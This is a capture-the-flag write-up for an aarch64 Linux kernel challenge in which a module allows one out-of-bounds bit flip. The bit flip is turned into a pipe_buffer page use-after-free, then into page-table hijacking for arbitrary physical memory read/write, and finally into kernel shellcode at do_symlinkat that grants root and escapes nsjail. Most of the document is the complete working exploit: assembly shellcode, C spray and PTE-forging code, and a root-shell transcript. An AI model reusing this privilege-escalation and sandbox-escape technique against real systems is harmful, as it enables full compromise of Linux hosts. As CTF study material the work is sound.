# Challenge overview

It's a simple aarch64 Linux kernel module with the following interesting ioctl:

```c
static long pwn_ioctl(struct file *filp, unsigned int cmd, unsigned long arg) {
    struct params p;
    int ret = -EINVAL;
    void *ptr = NULL;

    if (copy_from_user(&p, (void *)arg, sizeof(p)))
        return ret;

    if (!p.size || (p.size > 192))
        return ret;

    mutex_lock(&g_mutex);
    if (!done) {
        ptr = kmalloc(p.size, p.account ? GFP_KERNEL_ACCOUNT : GFP_KERNEL);
        if (!ptr)
            goto err;

        u64 page = (u64)ptr & ~0xfffUL;
        u64 pval = (u64)ptr + (p.idx / 8);
        if ((pval & ~0xfffUL) != page)
            goto err;

        change_bit(p.idx, ptr);

        done = 1;
    }

    ptr = NULL;
    ret = 0;
err:
    if (ptr)
        kfree(ptr);
    mutex_unlock(&g_mutex);
    return ret;
}
```

In short, we can ask the module for a heap allocation of size below or equal to
192, and we also control the allocation flags. Then, we can flip a bit in the
same page where our chunk was allocated (`change_bit()` is not bound-checked).
All of that only once, and in the same shot. Pretty low primitive. Also, our
welcome shell runs inside nsjail.

# Solution

Our solution consists in getting arbitrary physical memory read/write by messing
with the page tables. With this we can bruteforce the kernel text base address,
and write a shellcode in a syscall handler that when executed will escape our
task from the sandbox and also getting root. The idea to get arb physical memory
read/write is to flip a victim `pipe_buffer->page` bit to make it point to
another valid page, that we'll free afterwrads to get a sort of `struct page`
uaf. Then, we spray page tables to get out victim `pipe_buffer->page` being
reallocated to a level 2 page table. With this, we should be able to overwrite
page table entries by writing to our victim pipe and to get arb physical memory
read/write by writing a fake page table entry pointing to the physical address
we want.

Please find the full exploit [here](./solve).

Here is more detailed walkthrough:

1. Gaining physical memory arbitrary read and write
   1. Spray some
      [pipe_buffer](https://elixir.bootlin.com/linux/v6.15.2/source/include/linux/pipe_fs_i.h#L26)
      in kmalloc-cg-192 cache. We can do that by simply allocating pipes (so by
      calling `pipe()`). However, the default pipe (internally
      [pipe_inode_info](https://elixir.bootlin.com/linux/v6.15.2/source/include/linux/pipe_fs_i.h#L86)
      allocates 0x10 pipe buffers
      ([code](https://elixir.bootlin.com/linux/v6.15.2/source/fs/pipe.c#L816)),
      leading to `pipe->bufs` allocated in kmalloc-cg-1024 (0x10 * sizeof(struct
      pipe_buffer) = 640). To make the pipe buffers in kmalloc_cg-192, we can
      use the `F_SETPIPE_SZ` `fcntl` to change the number of internal buffers,
      reducing the size of `pipe->bufs`
      ([code](https://elixir.bootlin.com/linux/v6.15.2/source/fs/pipe.c#L1361)).
   2. Free 1 pipe buffer out of two, to make room for our future chunk allocated
      in the module.
   3. Allocate a chunk in kmalloc-cg-192 with the module ioctl, and flip the 6th
      bit of the next chunk. Here, we hope that our chunk is adjacent to a
      `pipe_buffer`, and we want to flip a bit in this adjacent `pipe_buffer`
      `page` field. Since `page`s are allocated in a contiguous memory region,
      we know that &victim_page + sizeof(struct page) points to another valid
      page. Furthermore, `sizeof(struct page) = 1 << 6`. The goal of this is
      that the flipped `page` address points to one of the sprayed pipe's
      `pipe_buffer->page`. With this, we'll have somehwere a victim pipe
      pointing to another pipe's buffer.
   4. Look for the victim pipe: we can simply read to all sprayed pipes, and
      check if the value we read is the same we initialized the pipe with. If it
      doesn't match, it means that this pipe's buffer point to another buffer.
      We successfuly flipped a `pipe_buffer->page` to another valid page.
   5. Free all pipes except our victim pipe. With this, our victim's pipe buffer
      is now backed by a freed page.
   6. Spray page tables by writing to `mmap()` regions in userspace (mapped at
      the beginning of the exploit). This will trigger a Data Abort, handled by
      the kernel by allocating new page tables. If the spray worked, we have our
      pipe buffer pointing to a level 2 page table (page tables are page-sized),
      containing page table entries. We can confirm that by writing a fake page
      table entry in our victim pipe, pointing to the physical address
      `0x40000000`. Now we can read to all mmap'ed regions and if for one, the
      read value is not the one we wrote when initilizaing the region, we know
      that we messed with the page table, and the address translation points to
      `0x40000000` physical address.
   7. Now that we have a our victim pipe and our victim page (the mapped region
      pointing to somewhere else), we can get arb read/write by writing a fake
      page table entry in the victim pipe buffer to the physical address we
      want, and reading/writing to it by the simply reading/writing to the
      victim page region (ie. simply `memcpy` to the address of the victim page,
      returned by `mmap`).

2. Finding the kernel base physical address by bruteforcing read to all pages
   start and check if the read value matches the 8 first bytes of the kernel
   .text.

3. Write our shellcode at `do_symlinkat()` address, which is called when
   creating a symlink. It's accessible within the sandbox. I stole this
   technique [here](https://ptr-yudai.hatenablog.com/entry/2023/12/08/093606). I
   also stole the shellcode we're writing and adapted it to aarch64. It does the
   following:

```
commit_creds(init_cred);
task = find_task_by_vpid(1);
switch_task_namespaces(task, init_nsproxy);
new_fs = copy_fs_struct(init_fs);
current_task = find_task_by_vpid(getpid());
current_task->fs = new_fs;
```

With this, we're able to get root, get unrestricted namespaces and use the
unsandboxed init_fs, giving full nsjail esapce.

We can now execute the shellcode by creating a symlink and profit.

```
===============================================================
=============== The gets() of kernel pwn challs ===============
===============================================================
sh: can't access tty; job control turned off
~ $ /jail/exploit
[+] Victim pipe found: 19
[+] Found victim sprayed page: 0xdfa00000
[+] Looking for kernel physical base address...
[+] Kernel physical base: 0xb5010000
[+] pid: 2
[+] Writing shellcode
[+] Triggering
sh: can't access tty; job control turned off
/ # id
uid=0(root) gid=0(root)
/ # cat /dev/vda
t  ����S�-�
           8�q��ۻ�B%Y1/tmp/flag_ڋ�ZP�,
                                      -�        t`
                                                  -�-�-��������  tktk��-�0-�-�-� -�A�������� �(2�(2�(2-�(������� tktk�.��tk
   .
    ..
      flag.txt

              .�..ptm{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}
```

# Limitations

Unfortunately the exploit is not reliable. The pipe spray is not very effective,
for whatever reason. It struggles allocating a pipe_buffer next to our chunk
allocated by the module. If this succeeds, the rest is reliable, but this step
is not. :(

# Full exploit

```asm
.section .data

.set x30_kbase_offset, 0x34dd20
.set init_cred, 0x20222b8
.set commit_creds, 0xce5f8
.set find_task_by_vpid, 0xc5250
.set init_nsproxy, 0x2022088
.set switch_task_namespaces, 0xcbb6c 
.set init_fs, 0x20a7938
.set copy_fs_struct, 0x384f54

.section .text
.global _start

_start:
        /* backup ret address on the stack */
        sub sp, sp, #0x8
        str x30, [sp]

        /* put kernel base in x27 based on the value in x30 */
        mov x27, x30
        movz x26, x30_kbase_offset & 0xffff
        movk x26, x30_kbase_offset >> 16, lsl 16
        subs x27, x27, x26

        /* commit_creds(init_cred) */
        mov x0, x27
        movz x26, init_cred & 0xffff
        movk x26, (init_cred) >> 16, lsl 16
        add x0, x0, x26

        mov x9, x27
        movz x26, commit_creds & 0xffff
        movk x26, (commit_creds) >> 16, lsl 16
        add x9, x9, x26
        blr x9
        
        /* task = find_task_by_vpid(1) */
        movz x0, 1
        mov x9, x27
        movz x26, find_task_by_vpid & 0xffff
        movk x26, (find_task_by_vpid) >> 16, lsl 16
        add x9, x9, x26
        blr x9
        
        /* switch_task_namespaces(task, init_nsproxy) */
        mov x1, x27
        movz x26, init_nsproxy & 0xffff
        movk x26, (init_nsproxy) >> 16, lsl 16
        add x1, x1, x26
        
        mov x9, x27
        movz x26, switch_task_namespaces & 0xffff
        movk x26, (switch_task_namespaces) >> 16, lsl 16
        add x9, x9, x26
        blr x9

        /* new_fs = copy_fs_struct(init_fs) */
        mov x0, x27
        movz x26, init_fs & 0xffff
        movk x26, (init_fs) >> 16, lsl 16
        add x0, x0, x26

        mov x9, x27
        movz x26, copy_fs_struct & 0xffff
        movk x26, (copy_fs_struct) >> 16, lsl 16
        add x9, x9, x26
        blr x9

        /* backup new_fs */
        mov x25, x0

        /* current = find_task_by_vpid(getpid()) */
        mov x0, 0x4141 /* patched at runtime */
        mov x9, x27
        movz x26, find_task_by_vpid & 0xffff
        movk x26, (find_task_by_vpid) >> 16, lsl 16
        add x9, x9, x26
        blr x9

        /* current->fs = new_fs  */
        str x25, [x0, #0x6d8]

        ldr x30, [sp]
        add sp, sp, #0x8
        ret
```

```c
#define _GNU_SOURCE
#include <assert.h>
#include <fcntl.h>
#include <sched.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define SPRAY 20
#define PAGE_SPRAY 0x200
#define PAGE_SIZE 0x1000uLL

struct params {
  uint32_t size;
  uint32_t idx;
  bool account;
};

static int fds[SPRAY][2];
static void *page_spray[PAGE_SPRAY];
static int64_t pipe_victim_idx = -1;
static void *victim_page = 0uLL;

char shellcode[] = {
    0xff, 0x23, 0x0,  0xd1, 0xfe, 0x3,  0x0,  0xf9, 0xfb, 0x3,  0x1e, 0xaa,
    0x1a, 0xa4, 0x9b, 0xd2, 0x9a, 0x6,  0xa0, 0xf2, 0x7b, 0x3,  0x1a, 0xeb,
    0xe0, 0x3,  0x1b, 0xaa, 0x1a, 0x57, 0x84, 0xd2, 0x5a, 0x40, 0xa0, 0xf2,
    0x0,  0x0,  0x1a, 0x8b, 0xe9, 0x3,  0x1b, 0xaa, 0x1a, 0xbf, 0x9c, 0xd2,
    0x9a, 0x1,  0xa0, 0xf2, 0x29, 0x1,  0x1a, 0x8b, 0x20, 0x1,  0x3f, 0xd6,
    0x20, 0x0,  0x80, 0xd2, 0xe9, 0x3,  0x1b, 0xaa, 0x1a, 0x4a, 0x8a, 0xd2,
    0x9a, 0x1,  0xa0, 0xf2, 0x29, 0x1,  0x1a, 0x8b, 0x20, 0x1,  0x3f, 0xd6,
    0xe1, 0x3,  0x1b, 0xaa, 0x1a, 0x11, 0x84, 0xd2, 0x5a, 0x40, 0xa0, 0xf2,
    0x21, 0x0,  0x1a, 0x8b, 0xe9, 0x3,  0x1b, 0xaa, 0x9a, 0x6d, 0x97, 0xd2,
    0x9a, 0x1,  0xa0, 0xf2, 0x29, 0x1,  0x1a, 0x8b, 0x20, 0x1,  0x3f, 0xd6,
    0xe0, 0x3,  0x1b, 0xaa, 0x1a, 0x27, 0x8f, 0xd2, 0x5a, 0x41, 0xa0, 0xf2,
    0x0,  0x0,  0x1a, 0x8b, 0xe9, 0x3,  0x1b, 0xaa, 0x9a, 0xea, 0x89, 0xd2,
    0x1a, 0x7,  0xa0, 0xf2, 0x29, 0x1,  0x1a, 0x8b, 0x20, 0x1,  0x3f, 0xd6,
    0xf9, 0x3,  0x0,  0xaa, 0x20, 0x28, 0x88, 0xd2, 0xe9, 0x3,  0x1b, 0xaa,
    0x1a, 0x4a, 0x8a, 0xd2, 0x9a, 0x1,  0xa0, 0xf2, 0x29, 0x1,  0x1a, 0x8b,
    0x20, 0x1,  0x3f, 0xd6, 0x19, 0x6c, 0x3,  0xf9, 0xfe, 0x3,  0x40, 0xf9,
    0xff, 0x23, 0x0,  0x91, 0xc0, 0x3,  0x5f, 0xd6,
};

// taken from
// https://github.com/google/google-ctf/blob/master/2023/pwn-kconcat/solution/exp.c
void hexdump(char *buf, int size) {
  for (int i = 0; i < size; i++) {
    if (i % 16 == 0)
      printf("%04x: ", i);
    printf("%02x ", buf[i]);
    if (i % 16 == 15)
      printf("\n");
  }
  if (size % 16 != 0)
    printf("\n");
}

void win(void) { system("sh"); }

void encode_mov(uint16_t value, char *output) {
  int32_t opcode = (0xd28 << 20) + (value << 5);
  for (int i = 0; i < 4; i++) {
    output[i] = (opcode & (0xff << (i * 8))) >> (i * 8);
  }
}

void patch_shellcode(uint16_t to_patch_val, uint16_t val) {
  void *p;
  char value[4];
  char to_patch[4];

  encode_mov(val, value);
  encode_mov(to_patch_val, to_patch);

  p = memmem(shellcode, sizeof(shellcode), to_patch, 4);
  if (!p) {
    perror("memem()");
    exit(EXIT_FAILURE);
  }

  memcpy(p, value, 4);
}

void spray_pipe() {
  int ret;
  char tmp[PAGE_SIZE];

  for (uint8_t i = 0; i < SPRAY; i++) {
    if (pipe(fds[i]) < 0) {
      perror("pipe()");
      exit(EXIT_FAILURE);
    }

    ret = fcntl(fds[i][0], F_SETPIPE_SZ, PAGE_SIZE * 4);
    if (ret < 0) {
      perror("fcntl()");
      exit(EXIT_FAILURE);
    }

    memset(&tmp, 0x41 + i, sizeof(tmp));
    if (write(fds[i][1], &tmp, sizeof(tmp)) < 0) {
      perror("write()");
      exit(EXIT_FAILURE);
    }
  }
}

static int *alloc_pipe_buf(int *fds) {
  int ret;
  char tmp[PAGE_SIZE];

  if (pipe(fds) < 0) {
    perror("pipe()");
    exit(EXIT_FAILURE);
  }

  ret = fcntl(fds[0], F_SETPIPE_SZ, PAGE_SIZE * 4);
  if (ret < 0) {
    perror("fcntl()");
    exit(EXIT_FAILURE);
  }

  // write a full page
  memset(&tmp, 0x41, sizeof(tmp));
  if (write(fds[1], &tmp, sizeof(tmp)) < 0) {
    perror("write()");
    exit(EXIT_FAILURE);
  }

  return fds;
}

static void free_pipe_buf(int *fds) {
  close(fds[1]);
  close(fds[0]);
}

void spray_page_tables() {
  for (int i = 0; i < PAGE_SPRAY; i++)
    for (int j = 0; j < 8; j++)
      *(uint8_t *)(page_spray[i] + j * PAGE_SIZE) = 0x61 + j;
}

// Finds the page whose page table was modified to point to target
// physical memory.
void *find_sprayed_page() {
  char page[PAGE_SIZE];

  // drain pipe
  if (read(fds[pipe_victim_idx][0], page, PAGE_SIZE) < 0) {
    perror("read()");
    exit(EXIT_FAILURE);
  }

  // write a dummy pte to 0x0000000040000000, which is always valid
  uint64_t new_pte = 0x0000000040000000 | (0xe8ULL << 48);
  new_pte |= (0xf43LL);

  if (write(fds[pipe_victim_idx][1], &new_pte, sizeof(new_pte)) < 0) {
    perror("write()");
    exit(EXIT_FAILURE);
  }

  for (int i = 0; i < PAGE_SPRAY; i++) {
    for (int j = 0; j < 8; j++) {
      uint8_t *victim = page_spray[i] + j * PAGE_SIZE;

      if (*victim != (0x61 + j)) {
        // restore pipe_buffer offset
        if (read(fds[pipe_victim_idx][0], page, sizeof(new_pte)) < 0) {
          perror("read()");
          exit(EXIT_FAILURE);
        }

        return victim;
      }
    }
  }

  return NULL;
}

// Returns the virtual address where we wrote.
void *phys_write(uint64_t dst_phys_addr, void *buf, size_t len) {
  char tmp[8];
  uint64_t dst_aligned_down = dst_phys_addr & ~(PAGE_SIZE - 1);
  uint64_t offset = dst_phys_addr & (PAGE_SIZE - 1);
  void *vaddr;

  uint64_t new_pte = dst_aligned_down | (0xe8ULL << 48);
  new_pte |= (0xf43LL);

  if (write(fds[pipe_victim_idx][1], &new_pte, sizeof(new_pte)) < 0) {
    perror("write()");
    exit(EXIT_FAILURE);
  }

  vaddr = victim_page + offset;
  memcpy(vaddr, buf, len);

  // reset pipe buffer offset after write
  if (read(fds[pipe_victim_idx][0], &tmp, sizeof(tmp)) < 0) {
    perror("read()");
    exit(EXIT_FAILURE);
  }

  return vaddr;
}

void phys_read(uint64_t dst_phys_addr, void *buf, size_t len) {
  char tmp[8];
  uint64_t dst_aligned_down = dst_phys_addr & ~(PAGE_SIZE - 1);
  uint64_t offset = dst_phys_addr & (PAGE_SIZE - 1);
  void *vaddr;

  uint64_t new_pte = dst_aligned_down | (0xe8ULL << 48);
  new_pte |= (0xf43LL);

  if (write(fds[pipe_victim_idx][1], &new_pte, sizeof(new_pte)) < 0) {
    perror("write()");
    exit(EXIT_FAILURE);
  }

  vaddr = victim_page + offset;
  memcpy(buf, vaddr, len);

  // reset pipe buffer offset after write
  if (read(fds[pipe_victim_idx][0], &tmp, sizeof(tmp)) < 0) {
    perror("read()");
    exit(EXIT_FAILURE);
  }
}

static const uint64_t kernel_text_magic = 0xd503245ff3576a22;
static uint64_t kernel_phys_base = 0uLL;

uint64_t find_kernel_phys_base() {
  uint64_t start = 0x0000000040000000;
  for (int i = 0; i < 0x1000000; i++) {
    uint64_t v = 0;
    uint64_t paddr = start + (PAGE_SIZE)*i;
    phys_read(paddr, &v, sizeof(v));
    if (v == kernel_text_magic) {
      return paddr;
    }
  }

  return 0;
}

void bind_core(int core) {
  cpu_set_t cpu_set;
  CPU_ZERO(&cpu_set);
  CPU_SET(core, &cpu_set);
  sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
}

int main(void) {
  int fd, ret;
  char tmp[0x60];
  char page[PAGE_SIZE];

  bind_core(0);

  for (int i = 0; i < PAGE_SPRAY; i++) {
    page_spray[i] =
        mmap((void *)(0xdead0000UL + i * 0x10000UL), 0x8000,
             PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    if (page_spray[i] == MAP_FAILED) {
      perror("mmap()");
      exit(EXIT_FAILURE);
    }
  }

  fd = open("/dev/pwn", O_RDWR);
  if (!fd) {
    perror("open()");
    exit(EXIT_FAILURE);
  }

  spray_pipe();

  for (int i = 0; i < SPRAY; i += 2) {
    free_pipe_buf(fds[i]);
  }

  // Allocate victim buffer in kmalloc-cg-192
  // we flip the first field (struct page* page)
  // to another page (sizeo(strutc page) = 0x40) so we can flip the 6th bit
  struct params a = {
      .size = 160,
      .idx = ((192 * 1) * 8 + 6), // adjacent chunk
      .account = true,
  };

  ret = ioctl(fd, 0, &a);
  if (ret < 0) {
    perror("ioctl()");
    exit(EXIT_FAILURE);
  }

  for (int i = 1; i < SPRAY; i += 2) {
    uint8_t c;
    uint8_t dummy[7];

    ret = read(fds[i][0], &c, sizeof(c));
    if (ret < 0) {
      perror("read()");
      exit(EXIT_FAILURE);
    }

    // dummy read to align the pipe buffer
    if (read(fds[i][0], &dummy, sizeof(dummy)) < 0) {
      perror("read()");
      exit(EXIT_FAILURE);
    }

    if (c != (0x41 + i)) {
      pipe_victim_idx = i;
      printf("[+] Victim pipe found: %d\n", i);
      break;
    }
  }

  if (pipe_victim_idx < 0) {
    puts("[!] No victim found");
    exit(EXIT_FAILURE);
  }

  for (int i = 1; i < SPRAY; i += 2) {
    if (i == pipe_victim_idx)
      continue;

    free_pipe_buf(fds[i]);
  }

  spray_page_tables();

  victim_page = find_sprayed_page();
  if (!victim_page) {
    puts("[!] Can't find the page with a modified PTE");
    exit(EXIT_FAILURE);
  }

  printf("[+] Found victim sprayed page: %p\n", victim_page);

  puts("[+] Looking for kernel physical base address...");
  kernel_phys_base = find_kernel_phys_base();
  if (!kernel_phys_base) {
    puts("[!] Failed to find kernel physical base");
    exit(EXIT_FAILURE);
  }

  printf("[+] Kernel physical base: 0x%lx\n", kernel_phys_base);

  int pid = getpid();
  printf("[+] pid: %d\n", pid);
  patch_shellcode(0x4141, pid);

  puts("[+] Writing shellcode");
  uint64_t do_symlink_at_offset = 0x34da30UL;
  phys_write(kernel_phys_base + do_symlink_at_offset, (void *)shellcode,
             sizeof(shellcode));

  puts("[+] Triggering");
  int cwd = open("/", O_DIRECTORY);
  symlinkat("/jail/exploit", cwd, "/jail");

  win();
  close(cwd);

  sleep(1000000);

  close(fd);
  return 0;
}
```
